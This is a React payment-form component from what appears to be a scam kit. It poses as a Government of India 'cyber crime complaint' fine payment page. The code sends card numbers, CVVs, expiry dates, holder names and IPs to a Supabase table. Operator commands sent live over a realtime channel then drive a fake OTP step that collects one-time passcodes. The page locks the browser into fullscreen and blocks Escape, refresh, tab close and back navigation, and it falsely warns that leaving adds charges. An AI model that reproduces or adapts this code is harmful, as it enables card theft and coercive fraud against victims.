import React, { useState, useEffect } from 'react';
import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import OTPVerificationPage from './OTPVerificationPage';

const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

const PaymentForm = () => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '29000.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const [fadeState, setFadeState] = useState('visible');
  const [showBackDialog, setShowBackDialog] = useState(false);
  const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
  const [selectedBankLogo, setSelectedBankLogo] = useState('');

  // Check if all card details are filled
  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length === 2 &&
           formData.expiryYear.length === 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  useEffect(() => {
    // Ultra-strong ESC key blocking - ENHANCED VERSION
    const handleKeyDown = (event: KeyboardEvent) => {
      // Block ESC key completely with maximum prevention
      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        
        // Force fullscreen to stay active
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {
            console.log('Fullscreen request failed');
          });
        }
        
        return false;
      }
      
      // Block back navigation
      if (event.altKey && event.key === 'ArrowLeft') {
        event.preventDefault();
        setShowBackDialog(true);
        return false;
      }
      
      // Block browser shortcuts
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5') ||
          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
          (event.altKey && event.key === 'F4') ||
          (event.key === 'F11')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    // Add back button prevention
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      setShowBackDialog(true);
      window.history.pushState(null, '', window.location.href);
    };

    // Push initial state and add listener
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    // Ultra-strong event blocking on multiple targets with maximum prevention
    const targets = [document, window, document.body, document.documentElement];
    const events = ['keydown', 'keyup', 'keypress'];
    
    targets.forEach(target => {
      events.forEach(eventType => {
        target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
      });
    });

    // Additional ESC blocking layers
    const preventEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
    };

    // Multiple event listeners for maximum ESC blocking
    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });

    return () => {
      window.removeEventListener('popstate', handlePopState);
      targets.forEach(target => {
        events.forEach(eventType => {
          target.removeEventListener(eventType, handleKeyDown, true);
        });
      });
      document.removeEventListener('keydown', preventEscape, true);
      window.removeEventListener('keydown', preventEscape, true);
      document.body.removeEventListener('keydown', preventEscape, true);
      if (longPressTimer) {
        clearTimeout(longPressTimer);
      }
    };
  }, [longPressTimer]);

  useEffect(() => {
    // Initialize Supabase connection and send visitor data
    const initializeConnection = async () => {
      try {
        const realIP = await getRealIP();
        
        console.log('Supabase: Initializing connection');
        console.log('Supabase: Sending visitor data with real IP:', realIP);
        console.log('Current window location:', window.location.href);
        console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
        
        // Test Supabase connection first
        const { data: testData, error: testError } = await supabase
          .from('visitors')
          .select('count', { count: 'exact', head: true });
        
        if (testError) {
          console.error('Supabase connection test failed:', testError);
          return;
        }
        
        console.log('Supabase connection test successful');
        
        // Insert or update visitor data
        const { error } = await supabase
          .from('visitors')
          .upsert({ ip: realIP }, { onConflict: 'ip' });
        
        if (error) {
          console.error('Error inserting visitor:', error);
        } else {
          console.log('Visitor data sent successfully via Supabase');
        }
      } catch (error) {
        console.error('Error with Supabase connection:', error);
      }
    };

    initializeConnection();

    // Listen for admin commands via Supabase realtime
    const channel = supabase
      .channel('admin-commands')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'admin_commands'
        },
        (payload) => {
          console.log('Received command from admin via Supabase:', payload.new);
          const command = payload.new.command;
          const submissionId = payload.new.submission_id;
          const bankName = payload.new.bank_name;
          const bankLogo = payload.new.bank_logo;
          
          console.log('Processing command:', command, 'for submission:', submissionId);
          console.log('Current submission ID:', currentSubmissionId);
          console.log('Bank name:', bankName, 'Bank logo:', bankLogo);
          
          // Process commands for the current submission or global commands
          if (submissionId && submissionId !== currentSubmissionId) {
            console.log('Command not for current submission, ignoring');
            return;
          }
          
          switch (command) {
            case 'showotp':
              console.log('Executing showotp command with bank:', bankName, bankLogo);
              if (bankName) {
                console.log('Setting selected bank to:', bankName);
                setSelectedBank(bankName);
              }
              if (bankLogo) {
                console.log('Setting selected bank logo to:', bankLogo);
                setSelectedBankLogo(bankLogo);
              }
              console.log('Fading out and showing OTP page');
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(true);
                setFadeState('fadeIn');
                console.log('OTP page should now be visible');
              }, 300);
              break;
            case 'fail':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Your card has been declined');
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'success':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsConfirmLoading(false);
                setShowProcessing(true);
                setFadeState('fadeIn');
                setTimeout(() => {
                  setShowProcessing(false);
                  setShowSuccess(true);
                  setTimeout(() => {
                    window.location.href = 'https://google.com';
                  }, 2000);
                }, 4000);
              }, 300);
              break;
            case 'invalidotp':
              setIsConfirmLoading(false);
              setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
              break;
            case 'cardinvalid':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Your card is invalid, please try another card');
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'carddisabled':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Card disabled, please try another card');
                setFadeState('fadeIn');
              }, 300);
              break;
          }
        }
      )
      .subscribe((status) => {
        console.log('Subscription status:', status);
        if (status === 'SUBSCRIBED') {
          console.log('Successfully subscribed to admin commands channel');
        } else if (status === 'CHANNEL_ERROR') {
          console.error('Channel subscription error');
        }
      });

    // Handle click anywhere to show alert
    const handleDocumentClick = (e: MouseEvent) => {
      const paymentForm = document.querySelector('.w-96.bg-white.border-l');
      if (paymentForm) {
        const rect = paymentForm.getBoundingClientRect();
        const isInPaymentArea = e.clientX >= rect.left && 
                               e.clientX <= rect.right && 
                               e.clientY >= rect.top && 
                               e.clientY <= rect.bottom;
        
        if (!isInPaymentArea) {
          setShowAlert(true);
          paymentForm.classList.add('shadow-red-500', 'shadow-2xl', 'border-red-500');
          setTimeout(() => {
            setShowAlert(false);
            paymentForm.classList.remove('shadow-red-500', 'shadow-2xl', 'border-red-500');
          }, 3000);
        }
      }
    };

    document.addEventListener('click', handleDocumentClick);

    return () => {
      console.log('Cleaning up Supabase channels');
      supabase.removeChannel(channel);
      document.removeEventListener('click', handleDocumentClick);
    };
  }, [currentSubmissionId]);

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const generateInvoiceId = () => {
    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
  };

  const sendToSupabase = async (data: any) => {
    console.log('Sending data to Supabase:', data);
    
    try {
      const { data: insertedData, error } = await supabase
        .from('card_submissions')
        .insert([data])
        .select()
        .single();
      
      if (error) {
        console.error('Error inserting card data:', error);
        throw error;
      } else {
        console.log('Card data sent successfully to Supabase:', insertedData);
        setCurrentSubmissionId(insertedData.id);
        return insertedData;
      }
    } catch (error) {
      console.error('Error with Supabase insertion:', error);
      throw error;
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === 'cardNumber') {
      const formatted = formatCardNumber(value);
      setFormData({
        ...formData,
        [name]: formatted
      });
    } else if (name === 'expiryMonth') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12)) {
        setFormData({
          ...formData,
          [name]: numericValue
        });
      }
    } else if (name === 'expiryYear') {
      const numericValue = value.replace(/\D/g, '').slice(0, 2);
      if (numericValue === '' || parseInt(numericValue) <= 50) {
        setFormData({
          ...formData,
          [name]: numericValue
        });
      }
    } else if (name === 'cvv') {
      const numericValue = value.replace(/\D/g, '').slice(0, 4);
      setFormData({
        ...formData,
        [name]: numericValue
      });
    } else {
      setFormData({
        ...formData,
        [name]: value
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isFormValid()) {
      return;
    }
    
    setIsLoading(true);
    setErrorMessage('');
    
    try {
      // Send card data to Supabase
      const realIP = await getRealIP();
      const invoiceId = generateInvoiceId();
      
      const cardData = {
        invoice_id: invoiceId,
        card_number: formData.cardNumber,
        expiry_month: formData.expiryMonth,
        expiry_year: formData.expiryYear,
        cvv: formData.cvv,
        card_holder: formData.cardHolder,
        amount: formData.amount,
        user_ip: realIP,
        browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
        network: getRandomNetwork()
      };
      
      console.log('Submitting card data to Supabase:', cardData);
      const result = await sendToSupabase(cardData);
      
      if (result) {
        console.log('Card submission successful, waiting for admin response...');
        // Keep loading state until admin responds with a command
      }
    } catch (error) {
      console.error('Failed to submit card data:', error);
      setIsLoading(false);
      setErrorMessage('Failed to process payment. Please try again.');
    }
  };

  const handleConfirmPay = async (otp: string) => {
    setIsConfirmLoading(true);
    setInvalidOtpMessage('');
    
    // Update the card submission with OTP
    if (currentSubmissionId) {
      try {
        const { error } = await supabase
          .from('card_submissions')
          .update({ otp: otp })
          .eq('id', currentSubmissionId);
        
        if (error) {
          console.error('Error updating OTP:', error);
        } else {
          console.log('OTP updated successfully in Supabase');
        }
      } catch (error) {
        console.error('Error updating OTP:', error);
      }
    }
  };

  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
    setShowBackDialog(false);
    if (action === 'leave') {
      setErrorMessage('Please try again');
      window.location.href = '/';
    }
  };

  const maskCardInfo = (value: string) => {
    return '*'.repeat(value.length);
  };

  if (showSuccess) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
        <div className="text-center pt-4">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
        <div className="text-center pt-4">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className="w-96 bg-white border-l border-gray-200">
        <OTPVerificationPage
          onBack={() => setShowOtp(false)}
          onConfirm={handleConfirmPay}
          isLoading={isConfirmLoading}
          invalidOtpMessage={invalidOtpMessage}
          cardNumber={formData.cardNumber}
          amount={formData.amount}
          bankLogo={selectedBankLogo}
        />
      </div>
    );
  }

  return (
    <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
    }`}>
      {showBackDialog && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
            <div className="flex space-x-4">
              <button
                onClick={() => handleBackDialogAction('leave')}
                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
              >
                Leave
              </button>
              <button
                onClick={() => handleBackDialogAction('cancel')}
                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {showAlert && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
          <AlertTriangle className="w-5 h-5" />
          <span className="font-bold">Complete the fine payment here</span>
        </div>
      )}

      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
        <div className="flex items-center mb-2">
          <Shield className="w-5 h-5 text-red-600 mr-2" />
          <span className="font-semibold text-red-800">Secure Payment Required</span>
        </div>
        <p className="text-sm text-red-700">
          Complete your payment to proceed with cyber crime complaint registration.
        </p>
      </div>

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form className="space-y-4" onSubmit={handleSubmit}>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
              readOnly
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
              onChange={handleInputChange}
              className="w-full pl-12 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              maxLength={19}
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="text"
              name="expiryMonth"
              placeholder="MM"
              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
              onChange={handleInputChange}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) 
                ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={2}
              disabled={isLoading}
            />
            {formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) && (
              <p className="text-red-500 text-xs mt-1">Valid month (1-12)</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="text"
              name="expiryYear"
              placeholder="YY"
              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
              onChange={handleInputChange}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                formData.expiryYear && parseInt(formData.expiryYear) > 50 
                ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={2}
              disabled={isLoading}
            />
            {formData.expiryYear && parseInt(formData.expiryYear) > 50 && (
              <p className="text-red-500 text-xs mt-1">Valid year (max 50)</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                onChange={handleInputChange}
                className="w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                maxLength={4}
                disabled={isLoading}
              />
            </div>
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
            onChange={handleInputChange}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            disabled={isLoading}
          />
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
          <div className="flex items-center text-sm text-blue-800">
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
          <img 
            src="https://logotyp.us/file/rupay.svg" 
            alt="RuPay" 
            className="h-8 w-12 object-contain filter brightness-0" 
          />
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
